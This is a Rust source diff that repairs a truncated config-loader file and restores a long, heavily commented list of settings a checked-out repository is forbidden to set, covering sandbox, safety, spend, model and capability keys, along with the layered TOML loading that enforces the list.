@@ -1,6 +1,3 @@
-Warning: truncated output (original token count: 147101)
-Total output lines: 13059
-
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 
@@ -4213,18 +4210,9 @@ const REPO_FORBIDDEN: &[(&[&str], &str)] = &[
     // AGENT` and `--agent` all still choose the agent same as before -- only
     // a repo checkout may not.
     (&["agent"], "ZIRV_CTX_AGENT"),
-    (
-        &["obfuscate", "mode"],
-        "ZIRV_CTX_OBFUSCATE_MODE",
-    ),
-    (
-        &["obfuscate", "entropy"],
-        "ZIRV_CTX_OBFUSCATE_ENTROPY",
-    ),
-    (
-        &["obfuscate", "prompt"],
-        "ZIRV_CTX_OBFUSCATE_PROMPT",
-    ),
+    (&["obfuscate", "mode"], "ZIRV_CTX_OBFUSCATE_MODE"),
+    (&["obfuscate", "entropy"], "ZIRV_CTX_OBFUSCATE_ENTROPY"),
+    (&["obfuscate", "prompt"], "ZIRV_CTX_OBFUSCATE_PROMPT"),
     (&["obfuscate", "allow"], "~/.zirv/ctx.toml only"),
     // A repository may request `mask` below, but never force the operator's
     // `mask` back to `keep`. `load` lifts and folds this key separately.
@@ -4557,7 +4545,4070 @@ const REPO_FORBIDDEN: &[(&[&str], &str)] = &[
     ),
     // Mouse capture takes over the terminal's own text selection, so which
     // way that trade goes is the operator's call about their own terminal,
-    // not a …47101 tokens truncated…, Some(1)),
+    // not a checked-out repo's.
+    (&["dash", "mouse"], "ZIRV_CTX_DASH_MOUSE"),
+    // Security review (2026-08-31): a repo checkout must not be able to
+    // widen which directories a pane spawned from it may run in and write
+    // to -- the same privilege-widening asymmetry `sandbox.extra_allow`
+    // already holds. See `DashConfig::workdir_roots`'s own doc comment.
+    (&["dash", "workdir_roots"], "ZIRV_CTX_DASH_WORKDIR_ROOTS"),
+    // A repo checkout must not be able to flip a spend decision (skipping
+    // throttle/pause gating on the operator's own vendor plan), re-enable
+    // the active API-poll fallback an operator turned off, or change its
+    // cadence -- credential reads and network calls are the operator's
+    // budget to spend, not the checkout's. `value_at` matches a table node
+    // the same way it matches a leaf, so this one entry also catches a repo
+    // setting only `[pace.use_credits]\ncodex = true` without `claude`.
+    (&["pace", "use_credits"], "ZIRV_CTX_PACE_USE_CREDITS_CLAUDE"),
+    (&["pace", "poll_enabled"], "ZIRV_CTX_PACE_POLL"),
+    (
+        &["pace", "poll_min_interval_secs"],
+        "ZIRV_CTX_PACE_POLL_MIN_INTERVAL_SECS",
+    ),
+    // T8: the fail-safe delay applied when the gate is genuinely blind (see
+    // `PaceConfig::blind_delay_secs`'s own doc comment) is a spend-safety
+    // floor, the same class of decision as `use_credits`/`poll_*` right
+    // above -- a repo checkout must not be able to shrink or zero it out and
+    // silently restore the old fail-open behavior for anyone who checks it
+    // out.
+    (
+        &["pace", "blind_delay_secs"],
+        "ZIRV_CTX_PACE_BLIND_DELAY_SECS",
+    ),
+    // Issue #155, Phase 6(c): `pace::spawn_gate`'s own soft/hard band --
+    // whether a NEW delegated worker may be spawned at all, never whether an
+    // already-running session gets restarted (see `SpawnGate`'s own doc
+    // comment for why the two must stay independent). A repo checkout must
+    // not be able to change when the operator's account stops accepting new
+    // work, in EITHER direction: raising either percentage would let a
+    // checkout spend past a ceiling the operator set, and lowering one would
+    // let a checkout throttle delegation for an operator who did not ask for
+    // it -- the same "the checkout is not the operator" trust asymmetry
+    // every other entry in this list enforces, applied to a refusal
+    // threshold instead of a byte cap or a switch.
+    (&["pace", "spawn_soft_pct"], "ZIRV_CTX_PACE_SPAWN_SOFT_PCT"),
+    (&["pace", "spawn_hard_pct"], "ZIRV_CTX_PACE_SPAWN_HARD_PCT"),
+    // Issue #285: the default soft budget `zirv ctx objective set` applies
+    // when the operator's own `--budget-tokens` is omitted -- a spend
+    // ceiling, so it gets the same "checkout is not the operator" treatment
+    // as every other budget key in this list.
+    (
+        &["pace", "run_budget_tokens"],
+        "ZIRV_CTX_PACE_RUN_BUDGET_TOKENS",
+    ),
+    // Audit finding G1: the estimator layer is what the gate falls back to
+    // when no collector reading binds, and its two window budgets are what
+    // turn a raw token sum into the percentage the gate then paces on. A
+    // repo checkout able to set all three chooses BOTH the fallback source
+    // and the scale it is measured against -- it can hand itself an
+    // arbitrary "plenty of headroom" reading with no vendor data involved at
+    // all. `count_cache_reads` moves the same number by including or
+    // excluding the dominant token class in a cached session. All four are
+    // the operator's own spend picture, not the checkout's.
+    (&["pace", "estimator"], "ZIRV_CTX_PACE_ESTIMATOR"),
+    // Review round 1 (R1): `collector_max_age_secs` was narrow-only on the
+    // reading that lower is stricter. It is not -- `pace::binding` holds a
+    // fresh collector window authoritative, so shortening the horizon below a
+    // real reading's age discards it and lets the estimator's own (lower)
+    // figure bind instead. Both directions hand the checkout the gate's
+    // reading, so it joins the four keys above outright.
+    (
+        &["pace", "collector_max_age_secs"],
+        "ZIRV_CTX_PACE_COLLECTOR_MAX_AGE_SECS",
+    ),
+    (
+        &["pace", "five_hour_budget_tokens"],
+        "ZIRV_CTX_FIVE_HOUR_BUDGET",
+    ),
+    (
+        &["pace", "seven_day_budget_tokens"],
+        "ZIRV_CTX_SEVEN_DAY_BUDGET",
+    ),
+    (
+        &["pace", "count_cache_reads"],
+        "ZIRV_CTX_PACE_COUNT_CACHE_READS",
+    ),
+    // `chat.model` is deliberately ABSENT from this list. See `ChatConfig`'s
+    // own doc comment and the spec's "Orchestrator model" section
+    // (docs/superpowers/specs/2026-08-13-zirv-dashboard-design.md): unlike
+    // every model key above, it only shapes an interactive session the
+    // operator deliberately launched, and the choice is disclosed on the
+    // `zirv \u{25b8}` announcement channel (`chat::announce_model_choice`) --
+    // which `chrome.events`, right above, keeps repo-unsilenceable -- rather
+    // than spent silently in the background. A repo checkout may set it -- do
+    // not "fix" this by adding it here, and do not remove `chrome.events`
+    // from this list, which is what the exemption rests on.
+    //
+    // The exemption is safe against the cmd.exe argv-reparse injection class
+    // because the value is *charset-validated* at the end of `CtxConfig::load`
+    // (only `[A-Za-z0-9-._:/@]`, max 128 bytes): a validated model string can
+    // express no shell/cmd metacharacter, so it can never carry a payload even
+    // though it reaches an argv that `resolve_program` may route through
+    // `cmd.exe /c` on Windows. The disclosed operator-in-repo model-choice
+    // purpose survives (real model ids only ever use that charset); the RCE
+    // does not. This is a narrower, correctness-preserving guard than banning
+    // the key outright, which is why it stays out of `REPO_FORBIDDEN`.
+    //
+    // `chat.claude_permission_mode` (issue #504) is the opposite call from
+    // `chat.model` right above, on purpose: unlike a model choice, which is
+    // disclosed on screen and cannot itself widen what a session may DO,
+    // this key picks the interactive launch's native `--permission-mode` --
+    // `bypassPermissions` silently skips every prompt the shipped `default`
+    // posture and the safety hook both rely on. A repo checkout choosing it
+    // for the operator would be exactly the widening `sandbox.enabled`/
+    // `sandbox.extra_allow` already stand between an untrusted layer and, so
+    // it is `REPO_FORBIDDEN` outright rather than charset-validated like
+    // `chat.model`'s narrower guard above.
+    (
+        &["chat", "claude_permission_mode"],
+        "ZIRV_CTX_CHAT_CLAUDE_PERMISSION_MODE",
+    ),
+    // `review.claude`/`review.codex` are the opposite call from `chat.model`
+    // right above, on purpose: those pick which model spends the operator's
+    // vendor account running review work in the *background* (every `zirv
+    // ctx chat` orchestrator session), not a model chosen and disclosed for
+    // one interactive session the operator themselves launched -- the same
+    // "spent silently" distinction that puts `handoff.model`/`optimize.model`
+    // in this list. `value_at` matches a table node the same way it matches a
+    // leaf (see `pace.use_credits` above), so this one entry blocks both
+    // `review.claude` and `review.codex` together.
+    (&["review"], "ZIRV_CTX_REVIEW_MODEL_CLAUDE"),
+    // `worker.claude`/`worker.codex` are the same call as `review.*` right
+    // above, for the same reason: a repo checkout must not be able to pick
+    // which model -- and so which vendor account -- spends the operator's
+    // tokens running a delegated headless worker (`zirv ctx agent`, and the
+    // dashboard's own spawn-request pane variant), which is background spend
+    // an operator never explicitly launched an interactive session for. See
+    // `WorkerConfig`'s own doc comment. Unlike `review`/`pace.use_credits`
+    // above, these are two LEAF entries rather than one whole-table entry:
+    // issue #262 added `worker.max_depth`/`worker.deny_network` to this same
+    // table, and those two keys are deliberately NOT `REPO_FORBIDDEN` -- a
+    // repo checkout may narrow them (see `narrow_worker_max_depth`/
+    // `narrow_worker_deny_network`), so a whole-table entry here would wrongly
+    // block that narrowing too.
+    (&["worker", "claude"], "ZIRV_CTX_WORKER_MODEL_CLAUDE"),
+    (&["worker", "codex"], "ZIRV_CTX_WORKER_MODEL_CODEX"),
+    // Issue #262: the delegation-envelope defaults a ROOT session's
+    // `envelope::WorkerEnvelope` starts from. See `WorkerConfig`'s own doc
+    // comment on each field for why these two -- unlike `max_depth`/
+    // `deny_network` right above -- are operator-only outright rather than
+    // repo-narrowable: they set the STARTING point a repo could otherwise
+    // only ever narrow away from, so letting a repo raise them would be
+    // indistinguishable from letting it widen the narrow-only fold itself.
+    (
+        &["worker", "default_depth"],
+        "ZIRV_CTX_WORKER_DEFAULT_DEPTH",
+    ),
+    (
+        &["worker", "default_read_only"],
+        "ZIRV_CTX_WORKER_DEFAULT_READ_ONLY",
+    ),
+    // `handover.*` (issue #84): a repo checkout must not be able to pick
+    // which model -- and so which vendor account -- the orchestrator seat
+    // swaps onto via `zirv ctx handover`, the same trust asymmetry as
+    // `agent`/`review.*`/`worker.*` above. `value_at` matches a table node
+    // the same way it matches a leaf (see `pace.use_credits`/`review`/
+    // `worker` above), so this one entry blocks the whole `[handover]`
+    // table -- both agents, all three tiers -- together.
+    (&["handover"], "ZIRV_CTX_HANDOVER_CLAUDE_CHEAP"),
+    // Issue #395: `[endpoint.claude]`/`[endpoint.codex]` choose which vendor
+    // ACCOUNT a harness spends -- picking the account is the same trust
+    // asymmetry `agent`/`review.*`/`worker.*`/`handover.*` above already
+    // hold to, applied to a whole-endpoint retarget rather than a model
+    // choice within one native account. `value_at` matches a table node the
+    // same way it matches a leaf (see `handover` right above), so this one
+    // entry blocks the whole `[endpoint]` table, both agents, every field.
+    // Deliberately no `ENV_MAP` entry backs this: an endpoint override is
+    // `~/.zirv/ctx.toml`-only by design (see `EndpointConfig`'s own doc
+    // comment), so there is no environment variable to name here the way
+    // every other entry in this table names one.
+    (
+        &["endpoint"],
+        "the operator's own ~/.zirv/ctx.toml (there is no environment override for endpoint.*)",
+    ),
+    // `safety.allow`/`safety.default` (issue #83): unlike `safety.deny`/
+    // `safety.ask` (lifted out and unioned across layers -- see
+    // `super::safety`'s module doc, the identical narrowing-fold treatment
+    // `sandbox.extra_deny` gets), adding an `allow` entry or changing the
+    // unmatched-command `default` can only ever make the effective policy
+    // *looser*, never stricter -- there is no narrowing reading of either,
+    // so both are forbidden outright rather than folded, mirroring
+    // `sandbox.extra_allow` right above.
+    (&["safety", "allow"], "ZIRV_CTX_SAFETY_ALLOW"),
+    // `safety.escape_allow` (issue #147): the same widening-only reasoning
+    // as `safety.allow` right above, one narrower domain down -- it clears
+    // a family for a `--dangerously-disable-sandbox` retry specifically, so
+    // adding an entry can only ever loosen that gate, never narrow it.
+    (&["safety", "escape_allow"], "ZIRV_CTX_SAFETY_ESCAPE_ALLOW"),
+    (&["safety", "default"], "ZIRV_CTX_SAFETY_DEFAULT"),
+    // `safety.interactive_default` (2026-08-24): the unmatched-command
+    // verdict on an interactive launch, default `allow`. Same reasoning as
+    // `safety.default` right above and then some -- `allow` is the loosest
+    // verdict there is, so a checkout that could set it could silence every
+    // prompt for the session it is checked out in.
+    (
+        &["safety", "interactive_default"],
+        "ZIRV_CTX_SAFETY_INTERACTIVE_DEFAULT",
+    ),
+    // `safety.sql` (2026-08-24): same reasoning as the two `safety` keys
+    // above. Turning the SQL classifier off removes an `Ask` it would
+    // otherwise impose on a write statement reaching a broad allow rule or
+    // the permissive interactive default -- loosening only.
+    (&["safety", "sql"], "ZIRV_CTX_SAFETY_SQL"),
+    // Issue #155, Phase 6b: a repo checkout must not be able to move when the
+    // operator's own sessions rotate -- raising the ceiling (or the ratio
+    // that derives it) hides rot from the operator for longer; lowering the
+    // floor fires restarts, and the compaction/handoff they trigger, more
+    // often than the operator chose. Both directions are the checkout
+    // choosing spend/safety behavior for its own operator, the same trust
+    // asymmetry every other entry in this list enforces. All five keys that
+    // feed `rot::token_gates` are forbidden together, absolutes and ratios
+    // alike, so a checkout cannot route around the absolute-override block by
+    // tuning the ratio instead (or vice versa).
+    (&["score", "token_floor"], "ZIRV_CTX_TOKEN_FLOOR"),
+    (&["score", "token_ceiling"], "ZIRV_CTX_TOKEN_CEILING"),
+    (
+        &["score", "token_floor_ratio"],
+        "ZIRV_CTX_SCORE_TOKEN_FLOOR_RATIO",
+    ),
+    (
+        &["score", "token_ceiling_ratio"],
+        "ZIRV_CTX_SCORE_TOKEN_CEILING_RATIO",
+    ),
+    (
+        &["score", "model_context_tokens"],
+        "ZIRV_CTX_SCORE_MODEL_CONTEXT_TOKENS",
+    ),
+    // Issue #264: a repo checkout must not be able to widen how long a price
+    // table is presented as trustworthy, or point pricing at a file of its
+    // own choosing -- see `PriceConfig`'s own doc comment.
+    (
+        &["price", "stale_after_days"],
+        "ZIRV_CTX_PRICE_STALE_AFTER_DAYS",
+    ),
+    (&["price", "table_path"], "ZIRV_CTX_PRICE_TABLE_PATH"),
+    // Issue #315: a repo checkout must not be able to widen its own
+    // `zirv ctx search` output cap -- same trust asymmetry as every other
+    // byte cap in this table, see `SearchConfig`'s own doc comment.
+    (
+        &["search", "max_output_bytes"],
+        "ZIRV_CTX_SEARCH_MAX_OUTPUT_BYTES",
+    ),
+    // Issue #326: the compact-summary cap is the same byte-cap asymmetry as
+    // `search.max_output_bytes` above, and the two compaction switches are
+    // forbidden in BOTH directions -- see `OutputConfig`'s own doc comment.
+    (&["output", "compact"], "ZIRV_CTX_OUTPUT_COMPACT"),
+    (
+        &["output", "compact_min_bytes"],
+        "ZIRV_CTX_OUTPUT_COMPACT_MIN_BYTES",
+    ),
+    (
+        &["output", "compact_generic_min_bytes"],
+        "ZIRV_CTX_OUTPUT_COMPACT_GENERIC_MIN_BYTES",
+    ),
+    // Additive-only, but still operator-only: an untrusted checkout naming a
+    // program here decides that zirv never summarizes that program's output
+    // for any session run against it.
+    (&["output", "verbatim"], "ZIRV_CTX_OUTPUT_VERBATIM"),
+    (
+        &["output", "max_summary_bytes"],
+        "ZIRV_CTX_OUTPUT_MAX_SUMMARY_BYTES",
+    ),
+    // Issue #414: widens what a repository checkout's own `rg`/`grep`/
+    // `find`/`fd`/`ls`/`dir`/`tree` invocations get compacted into (from
+    // never, at any size, to a shape-aware summary) -- the same forbidden-
+    // both-directions asymmetry as `compact`/`compact_min_bytes`/
+    // `compact_generic_min_bytes` above, never the checkout's call.
+    (
+        &["output", "compact_search"],
+        "ZIRV_CTX_OUTPUT_COMPACT_SEARCH",
+    ),
+    // Bundled-defaults: same forbidden-both-directions asymmetry as
+    // `compact_search` right above -- a repo checkout must not be able to
+    // re-enable zirv's bundled `[[output.filter]]` rules for an operator
+    // who turned them off, nor turn off defaults an operator wants applied
+    // to every checkout.
+    (
+        &["output", "filter_defaults"],
+        "ZIRV_CTX_OUTPUT_FILTER_DEFAULTS",
+    ),
+    // Issue #417: the operator-declared `[[output.filter]]` rule list is a
+    // structured value with no `ZIRV_CTX_*` scalar/CSV shape to escape
+    // through (unlike `output.verbatim`'s comma-separated list), so the
+    // only way to set it at all is `~/.zirv/ctx.toml` -- same convention as
+    // `workflow.maintain` above. A repo checkout choosing how its own
+    // output gets shaped once summarized is the same widening
+    // `compact`/`compact_min_bytes`/`compact_generic_min_bytes` above are
+    // already forbidden from doing.
+    (&["output", "filter"], "~/.zirv/ctx.toml only"),
+    // Issue #358: rolling the orchestrator seat itself onto another harness
+    // is the same class of decision `handoff.model`/`optimize.model` already
+    // gate above -- a repo checkout must not be able to tune when an
+    // automatic seat rollover fires or how soon another one may follow.
+    // `fallback.auto_orchestrator_rollover` itself (the on/off switch) stays
+    // narrowing-only, like `fallback.enabled`, because a repo may safely
+    // disable it; only the keys that tune an ALREADY-enabled rollover's
+    // timing are forbidden outright.
+    (
+        &["fallback", "orchestrator_rollover_headroom_pct"],
+        "ZIRV_CTX_FALLBACK_ORCHESTRATOR_ROLLOVER_HEADROOM_PCT",
+    ),
+    (
+        &["fallback", "rollover_cooldown_secs"],
+        "ZIRV_CTX_FALLBACK_ROLLOVER_COOLDOWN_SECS",
+    ),
+    (
+        &["fallback", "reactive_force_after_secs"],
+        "ZIRV_CTX_FALLBACK_REACTIVE_FORCE_AFTER_SECS",
+    ),
+    // Issue #455: same reasoning one more time for the route-health breaker.
+    // `fallback.health.enabled` stays narrowing-only (a repo may safely
+    // switch health-aware routing off, exactly as it may `fallback.enabled`),
+    // but how many failures trip a route, over what window, and how long it
+    // stays tripped decide when the operator's vendor spend moves -- only
+    // they may set that.
+    (
+        &["fallback", "health", "open_after_failures"],
+        "ZIRV_CTX_FALLBACK_HEALTH_OPEN_AFTER_FAILURES",
+    ),
+    (
+        &["fallback", "health", "window_secs"],
+        "ZIRV_CTX_FALLBACK_HEALTH_WINDOW_SECS",
+    ),
+    (
+        &["fallback", "health", "cooldown_secs"],
+        "ZIRV_CTX_FALLBACK_HEALTH_COOLDOWN_SECS",
+    ),
+    // The degrade knobs are the same class of decision one step earlier: how
+    // bad a route has to get before zirv starts ranking it behind the
+    // operator's other vendor account.
+    (
+        &["fallback", "health", "degrade_error_rate_pct"],
+        "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_ERROR_RATE_PCT",
+    ),
+    (
+        &["fallback", "health", "degrade_min_samples"],
+        "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_MIN_SAMPLES",
+    ),
+    (
+        &["fallback", "health", "degrade_ttft_ms"],
+        "ZIRV_CTX_FALLBACK_HEALTH_DEGRADE_TTFT_MS",
+    ),
+    // Issue #326 B1: without this a repo checkout could simply raise its own
+    // parent-outcome budget, making the cap decorative -- same reasoning as
+    // every other byte cap in this table (`mail.max_delivered_bytes`,
+    // `memory.max_entry_bytes`, ...).
+    (
+        &["task", "max_parent_outcome_bytes"],
+        "ZIRV_CTX_TASK_MAX_PARENT_OUTCOME_BYTES",
+    ),
+    // Issue #352, one entry per key so the refusal names the exact one the
+    // checkout tried to set. `persistent` decides whether cloning a
+    // repository is enough to make sessions started from it outlive the
+    // operator's terminal; `history` decides whether rendered terminal
+    // output -- tokens and keys included -- is written to disk at all; and
+    // the two bounds would be decorative if the untrusted layer could simply
+    // raise its own, the same reasoning as every cap above.
+    (&["session", "persistent"], "ZIRV_CTX_SESSION_PERSISTENT"),
+    (&["session", "history"], "ZIRV_CTX_SESSION_HISTORY"),
+    (
+        &["session", "scrollback_rows"],
+        "ZIRV_CTX_SESSION_SCROLLBACK_ROWS",
+    ),
+    (
+        &["session", "stale_after_secs"],
+        "ZIRV_CTX_SESSION_STALE_AFTER_SECS",
+    ),
+    // Issue #483: the WHOLE `[capabilities]` table, as one prefix entry
+    // rather than a leaf per key -- `value_at` matches a prefix, so a repo
+    // layer that sets anything at all under it is rejected by name. Unlike
+    // every table where only some keys are operator-only, there is no
+    // narrowing half here: each key names an MCP server command zirv then
+    // spawns, a remote endpoint it authenticates to, a credential reference,
+    // or a browser binary it launches. A checked-out repository adding one is
+    // pure widening, and "repo-owned config may only narrow" leaves nothing
+    // for it to legitimately say.
+    (&["capabilities"], "ZIRV_CTX_CAPABILITIES"),
+    // Issue #491: the WHOLE `[runtime]` table, as one prefix entry, same
+    // reasoning as `[capabilities]` right above -- this decides which
+    // provider account a session with no explicit `--runtime` spends, and a
+    // checked-out repository redirecting that is pure widening in either
+    // direction. `~/.zirv/ctx.toml`, `ZIRV_CTX_RUNTIME` and the `--runtime`
+    // flag remain the only ways to set it.
+    (&["runtime"], "ZIRV_CTX_RUNTIME"),
+    // Issue #537 seam: the harness proxy decides which harness/model/
+    // workflow a launch spends the operator's own account on -- a repo
+    // checkout must not be able to turn it on, choose its decider, or loosen
+    // its confidence floor/request cap, the same trust asymmetry as
+    // `agent`/`handoff.model`/`endpoint` above. One leaf entry per key so the
+    // refusal names the exact one a checkout tried to set.
+    (&["proxy", "enabled"], "ZIRV_CTX_PROXY_ENABLED"),
+    (&["proxy", "decider"], "ZIRV_CTX_PROXY_DECIDER"),
+    (
+        &["proxy", "min_confidence"],
+        "ZIRV_CTX_PROXY_MIN_CONFIDENCE",
+    ),
+    (&["proxy", "min_margin"], "ZIRV_CTX_PROXY_MIN_MARGIN"),
+    (
+        &["proxy", "request_max_bytes"],
+        "ZIRV_CTX_PROXY_REQUEST_MAX_BYTES",
+    ),
+    (
+        &["proxy", "typesafe", "base_url"],
+        "ZIRV_CTX_PROXY_TYPESAFE_BASE_URL",
+    ),
+    (
+        &["proxy", "typesafe", "credential_env"],
+        "ZIRV_CTX_PROXY_TYPESAFE_CREDENTIAL_ENV",
+    ),
+    (
+        &["proxy", "typesafe", "model"],
+        "ZIRV_CTX_PROXY_TYPESAFE_MODEL",
+    ),
+    (
+        &["proxy", "typesafe", "timeout_secs"],
+        "ZIRV_CTX_PROXY_TYPESAFE_TIMEOUT_SECS",
+    ),
+    // Issue #537 seam extraction (task A1): the `[jev]` advisory-site gate --
+    // a repo checkout must not be able to turn on a Jev-backed decision path
+    // for any site, the same trust asymmetry as `[proxy]` right above. One
+    // leaf entry per key, same reasoning.
+    (&["jev", "memory"], "ZIRV_CTX_JEV_MEMORY"),
+    (&["jev", "supervisor"], "ZIRV_CTX_JEV_SUPERVISOR"),
+    (&["jev", "dispatch"], "ZIRV_CTX_JEV_DISPATCH"),
+    (&["jev", "review"], "ZIRV_CTX_JEV_REVIEW"),
+    (&["jev", "gates"], "ZIRV_CTX_JEV_GATES"),
+    (&["jev", "cache_ttl_secs"], "ZIRV_CTX_JEV_CACHE_TTL_SECS"),
+];
+
+fn value_at<'a>(table: &'a toml::Table, path: &[&str]) -> Option<&'a toml::Value> {
+    let (head, rest) = path.split_first()?;
+    let value = table.get(*head)?;
+    if rest.is_empty() {
+        return Some(value);
+    }
+    value_at(value.as_table()?, rest)
+}
+
+/// Marker error for a `REPO_FORBIDDEN` rejection (`reject_untrusted_keys`),
+/// distinct from every other way `CtxConfig::load` can fail (a bad env value,
+/// an unknown/mistyped key, an unreadable file). A **security refusal**, not
+/// a degrade-and-continue case like a layer that merely failed to parse (see
+/// `UnparsableLayer`) -- callers that need to tell the two apart (`zirv ctx
+/// status`'s exit code) use `is_repo_forbidden` rather than matching on the
+/// message text.
+#[derive(Debug)]
+struct RepoForbiddenError(String);
+
+impl std::fmt::Display for RepoForbiddenError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "{}", self.0)
+    }
+}
+
+impl std::error::Error for RepoForbiddenError {}
+
+/// Whether `error` (as returned by `CtxConfig::load`) is a `REPO_FORBIDDEN`
+/// rejection rather than any other load failure. `zirv ctx status` uses this
+/// to decide its exit code: non-zero for a security refusal, zero for
+/// everything else (including a skipped-unparsable layer, which is not even
+/// an `Err` any more -- see `CtxConfig::load`'s own doc comment).
+pub fn is_repo_forbidden(error: &(dyn std::error::Error + 'static)) -> bool {
+    error.is::<RepoForbiddenError>()
+}
+
+/// Loud rather than silent: a repo that sets one of these gets a message
+/// naming the key and where to put it, which beats wondering why the value in
+/// the file is being ignored.
+fn reject_untrusted_keys(layer: &toml::Table, path: &Path) -> CtxResult<()> {
+    for (key, variable) in REPO_FORBIDDEN {
+        if value_at(layer, key).is_some() {
+            return Err(Box::new(RepoForbiddenError(format!(
+                "{}: `{}` may not be set by a repository config, because it names something zirv \
+                 then runs. Set it in ~/{}/{} or with {} instead.",
+                path.display(),
+                key.join("."),
+                crate::utils::SCRIPT_DIR_NAME,
+                CTX_CONFIG_FILE,
+                variable
+            ))));
+        }
+    }
+    Ok(())
+}
+
+/// A `toml::de::Error`'s own `Display` renders a multi-line diagram (a
+/// location line, a gutter, the offending source line, a caret, then the
+/// message). `zirv ctx status`/the `zirv \u{25b8}` announcement both want one
+/// line: the location (`"TOML parse error at line X, column Y"`, `Display`'s
+/// own first line) plus `Error::message()`, which is exactly what an
+/// operator needs to find and fix the byte without the diagram. Deliberately
+/// does not include the path -- callers already have it (`UnparsableLayer::
+/// path`) and show it separately.
+fn summarize_parse_error(error: &toml::de::Error) -> String {
+    let rendered = error.to_string();
+    let first_line = rendered.lines().next().unwrap_or("TOML parse error");
+    // `Display` only prints a location line when it actually has a span to
+    // point at; without one (rare -- `toml::de::Error::custom` with no span)
+    // the first line already *is* the message, and prefixing it with itself
+    // would just repeat it.
+    if first_line.starts_with("TOML parse error") {
+        format!("{first_line}: {}", error.message())
+    } else {
+        error.message().to_string()
+    }
+}
+
+/// Reads one config layer, merging it into `into` on success. Returns
+/// `Ok(Some(_))`, not `Err`, when the file exists but fails to *parse* as
+/// TOML: a syntax error in an untrusted layer (either one -- `~/.zirv/
+/// ctx.toml` is operator-owned but still a hand-edited file a stray keystroke
+/// can break) must not abort the whole load, only that layer. `into` is left
+/// unchanged in that case, so the caller's merge sees nothing from it and
+/// defaults/the other layer apply. An I/O error (unreadable file, permission
+/// denied) is a different failure mode and still propagates via `?` -- this
+/// only degrades a *parse* failure.
+fn read_layer(
+    path: &Path,
+    into: &mut toml::Table,
+    is_home: bool,
+) -> CtxResult<Option<UnparsableLayer>> {
+    if !path.exists() {
+        return Ok(None);
+    }
+    let text = std::fs::read_to_string(path)?;
+    match toml::from_str::<toml::Table>(&text) {
+        Ok(layer) => {
+            merge(into, layer);
+            Ok(None)
+        }
+        Err(e) => Ok(Some(UnparsableLayer {
+            path: path.to_path_buf(),
+            message: summarize_parse_error(&e),
+            is_home,
+        })),
+    }
+}
+
+pub(super) fn operator_path() -> CtxResult<std::path::PathBuf> {
+    Ok(crate::utils::home_dir()?
+        .join(crate::utils::SCRIPT_DIR_NAME)
+        .join(CTX_CONFIG_FILE))
+}
+
+/// Validate just the operator document, without repo or environment overrides.
+pub(super) fn validate_operator_document(text: &str) -> CtxResult<()> {
+    let mut table: toml::Table = toml::from_str(text)?;
+    super::policy::resolve(table.remove(POLICY_SECTION), None, &|_| None)?;
+    super::safety::resolve(table.remove(SAFETY_SECTION), None, &|_| None)?;
+    let _: CtxConfig = toml::Value::Table(table)
+        .try_into()
+        .map_err(|e| format!("invalid ctx config: {e}"))?;
+    Ok(())
+}
+
+impl CtxConfig {
+    /// Whether the orchestrator seat may roll over automatically, resolving
+    /// `fallback.auto_orchestrator_rollover`'s "decide from the roster"
+    /// default: ON whenever more than one harness named in `fallback.order`
+    /// is enabled by the agent gate, OFF otherwise (a single-harness roster
+    /// has nowhere to roll over to, which `rollover::evaluate` refuses on
+    /// its own anyway). An explicit value from any layer wins outright --
+    /// see the field's own doc comment for the narrowing rules.
+    pub fn auto_orchestrator_rollover(&self) -> bool {
+        self.fallback.auto_orchestrator_rollover.unwrap_or_else(|| {
+            self.fallback
+                .order
+                .iter()
+                .filter(|name| self.agents.is_enabled(name))
+                .count()
+                >= 2
+        })
+    }
+
+    /// Layers `~/.zirv/ctx.toml`, then `<repo>/.zirv/ctx.toml`, then
+    /// `ZIRV_CTX_*`. Flags are applied by each verb after loading.
+    ///
+    /// A layer that fails to *parse* as TOML (either one -- a stray keystroke
+    /// in the untrusted repo file, or a hand-edit gone wrong in the
+    /// operator's own home file) is skipped, not fatal: `read_layer` reports
+    /// it as an `UnparsableLayer` instead of erroring, this function collects
+    /// every one it sees into the returned config's own `unparsable_layers`,
+    /// and the remaining layers plus defaults are used exactly as if the
+    /// broken layer had never existed. Defaults are the safe posture
+    /// (sandboxed, pacing on), so skipping a layer never *widens* anything --
+    /// see the type's own doc comment. This is never silent: `load` announces
+    /// once per process on the `zirv \u{25b8}` channel (`announce_unparsable_
+    /// layers_once`), and `zirv ctx status`/`zirv ctx optimize` both surface
+    /// the same list. A `REPO_FORBIDDEN` rejection is a different thing
+    /// entirely -- a key that *did* parse but names something a repo may not
+    /// set -- and still fails this call outright (see `is_repo_forbidden`).
+    pub fn load(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
+        let mut merged = toml::Table::new();
+        let mut unparsable_layers: Vec<UnparsableLayer> = Vec::new();
+
+        if let Ok(path) = operator_path()
+            && let Some(bad) = read_layer(&path, &mut merged, true)?
+        {
+            unparsable_layers.push(bad);
+        }
+        // `[policy]` is lifted out of every layer before the deep merge: a
+        // merge would let the repo layer's stance simply replace the
+        // operator's, which is the one thing a permissions surface must never
+        // allow. `policy::resolve` folds the same three layers with `max`
+        // instead, so the repo half can only narrow.
+        let home_policy = merged.remove(POLICY_SECTION);
+        // `[safety]` (issue #83) gets the identical whole-section lift, for
+        // the identical reason -- see `super::safety`'s module doc and the
+        // `safety` field's own doc comment.
+        let home_safety = merged.remove(SAFETY_SECTION);
+        // `sandbox.extra_deny` gets the identical treatment, one level
+        // deeper: a repo checkout may *add* deny entries (narrowing is
+        // always safe), but the ordinary merge would let its array replace
+        // the operator's home-layer one instead of adding to it. Resolved
+        // as a union below, once both layers are in hand. `extra_allow`
+        // needs no such lift: it is `REPO_FORBIDDEN` outright, so the repo
+        // layer never has a value here for `merge()` to clobber anything
+        // with.
+        let home_extra_deny = string_array(take_nested(&mut merged, "sandbox", "extra_deny"));
+        // T9 (repo-narrowing fold): `pace.enabled`/`max_percent`/`soft_percent`
+        // get the identical treatment, for the identical reason -- lifted out
+        // before the deep merge so a repo layer's value can never simply
+        // replace the operator's. Unlike `sandbox.extra_deny`'s union, these
+        // fold like `[policy]`'s own `Stance::max` (see `narrow_pace_bool`/
+        // `narrow_pace_percent` below): the *stricter* of the two layers wins,
+        // never the later one. `soft_percent`/`max_percent` share the same
+        // rule (lower is stricter); `enabled` uses the bool-ordering
+        // equivalent (`true` is stricter than `false`).
